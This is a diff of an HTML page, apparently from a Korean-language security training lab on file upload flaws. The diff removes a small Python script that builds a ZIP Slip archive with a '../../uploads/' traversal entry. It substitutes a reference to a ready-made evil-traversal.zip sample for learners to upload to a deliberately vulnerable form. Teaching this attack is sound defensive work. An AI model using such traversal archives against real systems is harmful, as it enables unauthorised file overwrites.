@@ -146,14 +146,7 @@ file.transferTo(dir.resolve(savedName).toFile());</div>
     </p>
 
     <div class="attack-hint mb">
-        <strong>악성 ZIP 생성 (Python):</strong>
-        <div class="code-block mt-sm">import zipfile
-
-zf = zipfile.ZipFile('zipslip.zip', 'w')
-zf.writestr('../../uploads/pwned.txt', 'ZIP Slip 성공')
-zf.writestr('normal.txt', '정상 파일')
-zf.close()</div>
-        <small style="display:block; margin-top:.5rem">위 스크립트로 zipslip.zip 생성 후 아래 취약 업로드에 올려보세요</small>
+        <strong>공격 파일:</strong> <code>samples/file-upload/evil-traversal.zip</code> — 아래 취약 ZIP 해제 폼에 올려보세요
     </div>
 
     <div class="row">
